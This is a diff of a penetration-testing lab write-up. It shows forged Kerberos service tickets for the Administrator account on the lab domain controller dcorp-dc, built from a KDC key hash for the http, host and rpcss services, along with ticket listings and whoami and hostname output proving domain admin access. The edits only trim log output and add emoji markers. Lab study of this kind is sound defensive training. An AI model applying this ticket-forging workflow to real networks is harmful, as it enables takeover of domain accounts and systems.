@@ -52,31 +52,9 @@ Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
 
 [*] Action: Build TGS📌
 
-[*] Trying to query LDAP using LDAPS for user information on domain controller dcorp-dc.dollarcorp.moneycorp.local
-[*] Searching path 'DC=dollarcorp,DC=moneycorp,DC=local' for '(samaccountname=Administrator)'
-[*] Retrieving group and domain policy information over LDAP from domain controller dcorp-dc.dollarcorp.moneycorp.local
-[*] Searching path 'DC=dollarcorp,DC=moneycorp,DC=local' for '(|(distinguishedname=CN=Group Policy Creator Owners,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Administrators,CN=Builtin,DC=dollarcorp,DC=moneycorp,DC=local)(objectsid=S-1-5-21-719815819-3726368948-3917688648-513)(name={31B2F340-016D-11D2-945F-00C04FB984F9}))'
-[*] Attempting to mount: \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL
-[X] Error mounting \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL error code ERROR_ACCESS_DENIED (5)
-[!] Warning: Unable to get domain policy information, skipping PasswordCanChange and PasswordMustChange PAC fields.
-[*] Attempting to mount: \\us.dollarcorp.moneycorp.local\SYSVOL
-[X] Error mounting \\us.dollarcorp.moneycorp.local\SYSVOL error code ERROR_BAD_NET_NAME (67)
-[!] Warning: Unable to get domain policy information, skipping PasswordCanChange and PasswordMustChange PAC fields.
-[*] Retrieving netbios name information over LDAP from domain controller dcorp-dc.dollarcorp.moneycorp.local
-[*] Searching path 'CN=Configuration,DC=moneycorp,DC=local' for '(&(netbiosname=*)(dnsroot=dollarcorp.moneycorp.local))'
-[*] Retrieving group and domain policy information over LDAP from domain controller dcorp-dc.dollarcorp.moneycorp.local
-[*] Searching path 'DC=dollarcorp,DC=moneycorp,DC=local' for '(|(distinguishedname=CN=Group Policy Creator Owners,CN=Users,DC=us,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Domain Admins,CN=Users,DC=us,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Administrators,CN=Builtin,DC=us,DC=dollarcorp,DC=moneycorp,DC=local)(objectsid=S-1-5-21-1028785420-4100948154-1806204659-513)(name={31B2F340-016D-11D2-945F-00C04FB984F9}))'
-[*] Attempting to mount: \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL
-[X] Error mounting \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL error code ERROR_ACCESS_DENIED (5)
-[!] Warning: Unable to get domain policy information, skipping PasswordCanChange and PasswordMustChange PAC fields.
-[*] Attempting to mount: \\us.dollarcorp.moneycorp.local\SYSVOL
-[X] Error mounting \\us.dollarcorp.moneycorp.local\SYSVOL error code ERROR_BAD_NET_NAME (67)
-[!] Warning: Unable to get domain policy information, skipping PasswordCanChange and PasswordMustChange PAC fields.
-[*] Retrieving netbios name information over LDAP from domain controller dcorp-dc.dollarcorp.moneycorp.local
-[*] Searching path 'CN=Configuration,DC=moneycorp,DC=local' for '(&(netbiosname=*)(dnsroot=dollarcorp.moneycorp.local))'
-[*] Building PAC
+[SNIP]
 
-[*] Domain         : DOLLARCORP.MONEYCORP.LOCAL (dcorp)
+[*] Domain         : DOLLARCORP.MONEYCORP.LOCAL🏛️ (dcorp)
 [*] SID            : S-1-5-21-719815819-3726368948-3917688648
 [*] UserId         : 500
 [*] Groups         : 544,512,520,513
@@ -85,7 +63,7 @@ Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
 [*] KDCKey         : 68D6C096C7CFEE52A45D6207489526BC
 [*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
 [*] Service        : http📌
-[*] Target         : dcorp-dc.dollarcorp.moneycorp.local📌
+[*] Target         : dcorp-dc📌.dollarcorp.moneycorp.local
 
 [*] Generating EncTicketPart
 [*] Signing PAC
@@ -129,7 +107,7 @@ Action: List Kerberos Tickets (Current User)
 
     [0] - 0x17 - rc4_hmac
       Start/End/MaxRenew: 2/13/2025 5:01:30 AM ; 2/13/2025 3:01:30 PM ; 2/20/2025 5:01:30 AM
-      Server Name       : http📌/dcorp-dc.dollarcorp.moneycorp.local📌 @ DOLLARCORP.MONEYCORP.LOCAL
+      Server Name       : http📌/dcorp-dc📌.dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
       Client Name       : Administrator🎭 @ DOLLARCORP.MONEYCORP.LOCAL🏛️
       Flags             : pre_authent, renewable, forwardable (40a00000)
 ```
@@ -141,7 +119,7 @@ Current LogonId is 0:0x848e43
 Cached Tickets: (1)
 
 #0>     Client: Administrator🎭 @ DOLLARCORP.MONEYCORP.LOCAL🏛️
-        Server: http📌/dcorp-dc.dollarcorp.moneycorp.local📌 @ DOLLARCORP.MONEYCORP.LOCAL
+        Server: http📌/dcorp-dc📌.dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
         KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
         Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
         Start Time: 2/13/2025 5:01:30 (local)
@@ -169,12 +147,12 @@ C:\Users\Administrator>
 
 `whoami`:
 ```
-dcorp\administrator
+dcorp\administrator👤
 ```
 
 `hostname`:
 ```
-dcorp-dc
+dcorp-dc🖥️
 ```
 🚩
 
@@ -218,31 +196,9 @@ Inject a ticket for HOST service.
 
 [*] Action: Build TGS📌
 
-[*] Trying to query LDAP using LDAPS for user information on domain controller dcorp-dc.dollarcorp.moneycorp.local
-[*] Searching path 'DC=dollarcorp,DC=moneycorp,DC=local' for '(samaccountname=Administrator)'
-[*] Retrieving group and domain policy information over LDAP from domain controller dcorp-dc.dollarcorp.moneycorp.local
-[*] Searching path 'DC=dollarcorp,DC=moneycorp,DC=local' for '(|(distinguishedname=CN=Group Policy Creator Owners,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Administrators,CN=Builtin,DC=dollarcorp,DC=moneycorp,DC=local)(objectsid=S-1-5-21-719815819-3726368948-3917688648-513)(name={31B2F340-016D-11D2-945F-00C04FB984F9}))'
-[*] Attempting to mount: \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL
-[X] Error mounting \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL error code ERROR_ACCESS_DENIED (5)
-[!] Warning: Unable to get domain policy information, skipping PasswordCanChange and PasswordMustChange PAC fields.
-[*] Attempting to mount: \\us.dollarcorp.moneycorp.local\SYSVOL
-[X] Error mounting \\us.dollarcorp.moneycorp.local\SYSVOL error code ERROR_BAD_NET_NAME (67)
-[!] Warning: Unable to get domain policy information, skipping PasswordCanChange and PasswordMustChange PAC fields.
-[*] Retrieving netbios name information over LDAP from domain controller dcorp-dc.dollarcorp.moneycorp.local
-[*] Searching path 'CN=Configuration,DC=moneycorp,DC=local' for '(&(netbiosname=*)(dnsroot=dollarcorp.moneycorp.local))'
-[*] Retrieving group and domain policy information over LDAP from domain controller dcorp-dc.dollarcorp.moneycorp.local
-[*] Searching path 'DC=dollarcorp,DC=moneycorp,DC=local' for '(|(distinguishedname=CN=Group Policy Creator Owners,CN=Users,DC=us,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Domain Admins,CN=Users,DC=us,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Administrators,CN=Builtin,DC=us,DC=dollarcorp,DC=moneycorp,DC=local)(objectsid=S-1-5-21-1028785420-4100948154-1806204659-513)(name={31B2F340-016D-11D2-945F-00C04FB984F9}))'
-[*] Attempting to mount: \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL
-[X] Error mounting \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL error code ERROR_ACCESS_DENIED (5)
-[!] Warning: Unable to get domain policy information, skipping PasswordCanChange and PasswordMustChange PAC fields.
-[*] Attempting to mount: \\us.dollarcorp.moneycorp.local\SYSVOL
-[X] Error mounting \\us.dollarcorp.moneycorp.local\SYSVOL error code ERROR_BAD_NET_NAME (67)
-[!] Warning: Unable to get domain policy information, skipping PasswordCanChange and PasswordMustChange PAC fields.
-[*] Retrieving netbios name information over LDAP from domain controller dcorp-dc.dollarcorp.moneycorp.local
-[*] Searching path 'CN=Configuration,DC=moneycorp,DC=local' for '(&(netbiosname=*)(dnsroot=dollarcorp.moneycorp.local))'
-[*] Building PAC
+[SNIP]
 
-[*] Domain         : DOLLARCORP.MONEYCORP.LOCAL (dcorp)
+[*] Domain         : DOLLARCORP.MONEYCORP.LOCAL🏛️ (dcorp)
 [*] SID            : S-1-5-21-719815819-3726368948-3917688648
 [*] UserId         : 500
 [*] Groups         : 544,512,520,513
@@ -251,7 +207,7 @@ Inject a ticket for HOST service.
 [*] KDCKey         : 68D6C096C7CFEE52A45D6207489526BC
 [*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
 [*] Service        : host📌
-[*] Target         : dcorp-dc.dollarcorp.moneycorp.local📌
+[*] Target         : dcorp-dc📌.dollarcorp.moneycorp.local
 
 [*] Generating EncTicketPart
 [*] Signing PAC
@@ -280,31 +236,9 @@ Inject a ticket for RPCSS service.
 
 [*] Action: Build TGS📌
 
-[*] Trying to query LDAP using LDAPS for user information on domain controller dcorp-dc.dollarcorp.moneycorp.local
-[*] Searching path 'DC=dollarcorp,DC=moneycorp,DC=local' for '(samaccountname=Administrator)'
-[*] Retrieving group and domain policy information over LDAP from domain controller dcorp-dc.dollarcorp.moneycorp.local
-[*] Searching path 'DC=dollarcorp,DC=moneycorp,DC=local' for '(|(distinguishedname=CN=Group Policy Creator Owners,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Administrators,CN=Builtin,DC=dollarcorp,DC=moneycorp,DC=local)(objectsid=S-1-5-21-719815819-3726368948-3917688648-513)(name={31B2F340-016D-11D2-945F-00C04FB984F9}))'
-[*] Attempting to mount: \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL
-[X] Error mounting \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL error code ERROR_ACCESS_DENIED (5)
-[!] Warning: Unable to get domain policy information, skipping PasswordCanChange and PasswordMustChange PAC fields.
-[*] Attempting to mount: \\us.dollarcorp.moneycorp.local\SYSVOL
-[X] Error mounting \\us.dollarcorp.moneycorp.local\SYSVOL error code ERROR_BAD_NET_NAME (67)
-[!] Warning: Unable to get domain policy information, skipping PasswordCanChange and PasswordMustChange PAC fields.
-[*] Retrieving netbios name information over LDAP from domain controller dcorp-dc.dollarcorp.moneycorp.local
-[*] Searching path 'CN=Configuration,DC=moneycorp,DC=local' for '(&(netbiosname=*)(dnsroot=dollarcorp.moneycorp.local))'
-[*] Retrieving group and domain policy information over LDAP from domain controller dcorp-dc.dollarcorp.moneycorp.local
-[*] Searching path 'DC=dollarcorp,DC=moneycorp,DC=local' for '(|(distinguishedname=CN=Group Policy Creator Owners,CN=Users,DC=us,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Domain Admins,CN=Users,DC=us,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Administrators,CN=Builtin,DC=us,DC=dollarcorp,DC=moneycorp,DC=local)(objectsid=S-1-5-21-1028785420-4100948154-1806204659-513)(name={31B2F340-016D-11D2-945F-00C04FB984F9}))'
-[*] Attempting to mount: \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL
-[X] Error mounting \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL error code ERROR_ACCESS_DENIED (5)
-[!] Warning: Unable to get domain policy information, skipping PasswordCanChange and PasswordMustChange PAC fields.
-[*] Attempting to mount: \\us.dollarcorp.moneycorp.local\SYSVOL
-[X] Error mounting \\us.dollarcorp.moneycorp.local\SYSVOL error code ERROR_BAD_NET_NAME (67)
-[!] Warning: Unable to get domain policy information, skipping PasswordCanChange and PasswordMustChange PAC fields.
-[*] Retrieving netbios name information over LDAP from domain controller dcorp-dc.dollarcorp.moneycorp.local
-[*] Searching path 'CN=Configuration,DC=moneycorp,DC=local' for '(&(netbiosname=*)(dnsroot=dollarcorp.moneycorp.local))'
-[*] Building PAC
+[SNIP]
 
-[*] Domain         : DOLLARCORP.MONEYCORP.LOCAL (dcorp)
+[*] Domain         : DOLLARCORP.MONEYCORP.LOCAL🏛️ (dcorp)
 [*] SID            : S-1-5-21-719815819-3726368948-3917688648
 [*] UserId         : 500
 [*] Groups         : 544,512,520,513
@@ -313,7 +247,7 @@ Inject a ticket for RPCSS service.
 [*] KDCKey         : 68D6C096C7CFEE52A45D6207489526BC
 [*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
 [*] Service        : rpcss📌
-[*] Target         : dcorp-dc.dollarcorp.moneycorp.local📌
+[*] Target         : dcorp-dc📌.dollarcorp.moneycorp.local
 
 [*] Generating EncTicketPart
 [*] Signing PAC
@@ -345,7 +279,7 @@ Current LogonId is 0:0x848dc4
 Cached Tickets: (2)
 
 #0>     Client: Administrator🎭 @ DOLLARCORP.MONEYCORP.LOCAL🏛️
-        Server: rpcss📌/dcorp-dc.dollarcorp.moneycorp.local📌 @ DOLLARCORP.MONEYCORP.LOCAL
+        Server: rpcss📌/dcorp-dc📌.dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
         KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
         Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
         Start Time: 2/13/2025 5:07:08 (local)
@@ -356,7 +290,7 @@ Cached Tickets: (2)
         Kdc Called:
 
 #1>     Client: Administrator🎭 @ DOLLARCORP.MONEYCORP.LOCAL🏛️
-        Server: host📌/dcorp-dc.dollarcorp.moneycorp.local📌 @ DOLLARCORP.MONEYCORP.LOCAL
+        Server: host📌/dcorp-dc📌.dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
         KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
         Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
         Start Time: 2/13/2025 5:05:47 (local)
